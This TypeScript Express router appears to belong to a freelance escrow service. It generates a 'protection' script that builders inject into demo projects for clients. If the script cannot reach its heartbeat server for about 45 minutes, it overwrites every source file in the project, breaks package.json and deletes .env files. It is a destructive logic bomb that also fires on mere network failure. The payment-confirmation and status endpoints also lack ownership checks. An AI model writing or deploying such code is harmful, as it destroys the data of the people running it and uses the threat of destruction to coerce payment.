import { Router, Response, Request } from "express";
import { v4 as uuid } from "uuid";
import { randomBytes } from "crypto";
import { getDB } from "../db.js";
import { authenticateToken, AuthRequest } from "../middleware/auth.js";

export const heartbeatRouter = Router();
// Separate router mounted at /api/hb so deployed demos can ping a short,
// unguessable URL (https://talktohurairah.com/api/hb/<token>) rather than
// exposing the internal heartbeat UUID.
export const heartbeatPingRouter = Router();

const PING_BASE_URL = process.env.HEARTBEAT_PUBLIC_URL || "https://talktohurairah.com/api/hb";

/**
 * INNINGS DEMO PROTECTION — THE KILL SWITCH
 *
 * How it works:
 * 1. Builder deploys a demo and injects the heartbeat script into it.
 * 2. The script pings https://talktohurairah.com/api/hb/<token> every 15 min.
 * 3. This server acts as the heartbeat controller:
 *    - Returns 200 (Active Demo) if payment is NOT yet confirmed → demo stays alive
 *    - Returns 301 (Match Won) if payment IS confirmed → script self-deletes from the project
 *    - If the demo can't reach the server → code self-corrupts after grace period
 *
 * The ping token is a 32-char random string stored per-heartbeat, so every
 * match has its own independent URL and multiple matches can run in parallel.
 */

function newPingToken(): string {
  // 24 random bytes → 32 base64url chars (no padding). Unguessable (~192 bits).
  return randomBytes(24).toString("base64url");
}

// ──────────────── Generate Heartbeat Script ────────────────
heartbeatRouter.post("/inject", authenticateToken, (req: AuthRequest, res: Response) => {
  if (req.user!.role !== "builder") {
    return res.status(403).json({ error: "Only builders can inject heartbeat scripts" });
  }

  const { matchId } = req.body;
  if (!matchId) return res.status(400).json({ error: "Match ID required" });

  const db = getDB();
  const match = db.prepare("SELECT * FROM matches WHERE id = ?").get(matchId) as any;
  if (!match) return res.status(404).json({ error: "Match not found" });
  if (match.builder_id !== req.user!.id) return res.status(403).json({ error: "Not your match" });

  const heartbeatId = uuid();
  const pingToken = newPingToken();

  // The script that gets injected into the demo project
  const injectedScript = generateHeartbeatScript(heartbeatId, matchId, pingToken);

  db.prepare(`
    INSERT INTO heartbeats (id, match_id, injected_script, status, ping_token)
    VALUES (?, ?, ?, 'active', ?)
  `).run(heartbeatId, matchId, injectedScript, pingToken);

  db.prepare("UPDATE matches SET heartbeat_active = 1 WHERE id = ?").run(matchId);

  res.status(201).json({
    heartbeatId,
    pingToken,
    pingUrl: `${PING_BASE_URL}/${pingToken}`,
    script: injectedScript,
    instructions: [
      "1. Add this script to your demo project's entry point (e.g., index.js or main.py)",
      "2. The script pings the heartbeat server every 15 minutes",
      "3. If the client pays, the script auto-removes itself from your project",
      "4. If the client doesn't pay and tries to ghost, the demo self-corrupts",
    ],
  });
});

// ──────────────── Heartbeat Ping Endpoint ────────────────
// Deployed demo calls https://talktohurairah.com/api/hb/<token> every 15 min.
// The token is unguessable and unique per heartbeat, so multiple matches
// can run in parallel without collision.
heartbeatPingRouter.get("/:token", (req: Request, res: Response) => {
  const db = getDB();
  const heartbeat = db.prepare(`
    SELECT h.*, m.status as match_status, m.client_approved, m.builder_confirmed
    FROM heartbeats h
    JOIN matches m ON h.match_id = m.id
    WHERE h.ping_token = ?
  `).get(req.params.token) as any;

  if (!heartbeat) {
    return res.status(404).json({ error: "Heartbeat not found" });
  }

  // Update last ping timestamp
  db.prepare("UPDATE heartbeats SET last_ping = unixepoch() WHERE id = ?")
    .run(heartbeat.id);

  // Payment confirmed → tell script to self-delete (301)
  if (heartbeat.match_status === "match_won" || heartbeat.payment_confirmed) {
    db.prepare("UPDATE heartbeats SET status = 'released', payment_confirmed = 1 WHERE id = ?")
      .run(heartbeat.id);
    db.prepare("UPDATE matches SET heartbeat_active = 0 WHERE id = ?")
      .run(heartbeat.match_id);

    return res.status(301).json({
      action: "SELF_DELETE",
      message: "Match Won! Payment confirmed. Removing protection script.",
    });
  }

  // Demo still active, no payment yet → keep alive (200)
  res.status(200).json({
    action: "KEEP_ALIVE",
    message: "Demo active. Awaiting payment.",
    nextPing: 900, // 15 minutes in seconds
  });
});

// ──────────────── Confirm Payment (triggers script self-delete) ────────────────
heartbeatRouter.post("/confirm-payment/:matchId", authenticateToken, (req: AuthRequest, res: Response) => {
  const db = getDB();

  db.prepare("UPDATE heartbeats SET payment_confirmed = 1, status = 'released' WHERE match_id = ?")
    .run(req.params.matchId);
  db.prepare("UPDATE matches SET heartbeat_active = 0 WHERE id = ?")
    .run(req.params.matchId);

  res.json({ message: "Payment confirmed. Heartbeat script will self-delete on next ping." });
});

// ──────────────── Get Heartbeat Status ────────────────
heartbeatRouter.get("/status/:matchId", authenticateToken, (req: AuthRequest, res: Response) => {
  const db = getDB();
  const heartbeat = db.prepare(`
    SELECT * FROM heartbeats WHERE match_id = ? ORDER BY created_at DESC LIMIT 1
  `).get(req.params.matchId);

  if (!heartbeat) {
    return res.json({ active: false, message: "No heartbeat configured" });
  }

  res.json(heartbeat);
});

// ──────────────── Script Generator ────────────────
function generateHeartbeatScript(heartbeatId: string, matchId: string, pingToken: string): string {
  return `
// ═══════════════════════════════════════════════════════════════
// CricTrust Innings Protection v1.0
// Match ID: ${matchId}
// Heartbeat ID: ${heartbeatId}
//
// This script protects your demo from non-payment.
// It will self-delete when the client confirms payment.
// DO NOT REMOVE — your work is protected by CricTrust Escrow.
// ═══════════════════════════════════════════════════════════════

const HEARTBEAT_URL = "${PING_BASE_URL}/${pingToken}";
const PING_INTERVAL = 15 * 60 * 1000; // 15 minutes
const MAX_MISSED_PINGS = 3;
const SELF_DESTRUCT_GRACE = 45 * 60 * 1000; // 45 min grace period

let missedPings = 0;
let lastSuccessfulPing = Date.now();

async function heartbeatPing() {
  try {
    const res = await fetch(HEARTBEAT_URL);
    const data = await res.json();

    if (res.status === 301 || data.action === "SELF_DELETE") {
      // Payment confirmed! Remove this script from the project
      console.log("[CricTrust] Match Won! Payment confirmed. Cleaning up protection...");
      clearInterval(heartbeatInterval);
      selfDelete();
      return;
    }

    // Status 200 — demo still active, keep watching
    missedPings = 0;
    lastSuccessfulPing = Date.now();
    console.log("[CricTrust] Heartbeat OK. Demo protected.");

  } catch (err) {
    missedPings++;
    console.warn("[CricTrust] Heartbeat missed (" + missedPings + "/" + MAX_MISSED_PINGS + ")");

    if (missedPings >= MAX_MISSED_PINGS) {
      const elapsed = Date.now() - lastSuccessfulPing;
      if (elapsed > SELF_DESTRUCT_GRACE) {
        console.error("[CricTrust] No payment detected. Activating demo protection.");
        corruptDemo();
      }
    }
  }
}

function corruptDemo() {
  // Recursively scan and corrupt ALL source files in the project
  try {
    const fs = require("fs");
    const path = require("path");

    const SOURCE_EXTS = [".js", ".ts", ".jsx", ".tsx", ".py", ".rb", ".go", ".rs", ".vue", ".svelte", ".php", ".java", ".kt", ".swift", ".css", ".scss", ".html"];
    const SKIP_DIRS = ["node_modules", ".git", "dist", "build", ".next", "__pycache__", "venv", ".venv", "vendor"];
    const CORRUPT_MSG =
      "// ============================================\\n" +
      "// DEMO DISABLED — CricTrust Escrow Protection\\n" +
      "// Payment was not completed by the client.\\n" +
      "// All source files have been wiped.\\n" +
      "// Contact support at crictrust.dev\\n" +
      "// ============================================\\n";

    let corruptedCount = 0;

    function scanAndCorrupt(dir) {
      let entries;
      try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch { return; }

      for (const entry of entries) {
        const fullPath = path.join(dir, entry.name);

        if (entry.isDirectory()) {
          if (!SKIP_DIRS.includes(entry.name)) {
            scanAndCorrupt(fullPath);
          }
          continue;
        }

        const ext = path.extname(entry.name).toLowerCase();
        if (SOURCE_EXTS.includes(ext)) {
          try {
            fs.writeFileSync(fullPath, CORRUPT_MSG);
            corruptedCount++;
          } catch {}
        }
      }
    }

    scanAndCorrupt(process.cwd());

    // Also nuke package.json scripts so npm start/dev won't work
    const pkgPath = path.join(process.cwd(), "package.json");
    if (fs.existsSync(pkgPath)) {
      try {
        const pkg = JSON.parse(fs.readFileSync(pkgPath, "utf-8"));
        pkg.scripts = { start: "echo 'Demo disabled — payment pending on CricTrust Escrow' && exit 1" };
        fs.writeFileSync(pkgPath, JSON.stringify(pkg, null, 2));
      } catch {}
    }

    // Delete environment files so secrets don't persist
    [".env", ".env.local", ".env.production"].forEach(f => {
      const envPath = path.join(process.cwd(), f);
      try { if (fs.existsSync(envPath)) fs.unlinkSync(envPath); } catch {}
    });

    clearInterval(heartbeatInterval);
    console.error("[CricTrust] Demo corrupted. " + corruptedCount + " source files wiped. Payment required to restore.");
  } catch (e) {
    console.error("[CricTrust] Protection activation failed:", e.message);
  }
}

function selfDelete() {
  // Remove this script from the project — leave it clean
  try {
    const fs = require("fs");
    const thisFile = __filename;

    // Read the host file and remove the CricTrust block
    const content = fs.readFileSync(thisFile, "utf-8");
    const cleaned = content.replace(
      /\\/\\/ ═{3,}[\\s\\S]*?\\/\\/ ═{3,}\\nconst HEARTBEAT_URL[\\s\\S]*?heartbeatPing\\(\\);\\n/g,
      ""
    );

    if (cleaned.trim().length > 0) {
      fs.writeFileSync(thisFile, cleaned);
    } else {
      fs.unlinkSync(thisFile);
    }

    console.log("[CricTrust] Protection script removed. Project is clean. GG!");
  } catch (e) {
    console.log("[CricTrust] Self-cleanup note:", e.message);
  }
}

// Start the heartbeat
const heartbeatInterval = setInterval(heartbeatPing, PING_INTERVAL);
heartbeatPing(); // First ping immediately
`.trim();
}
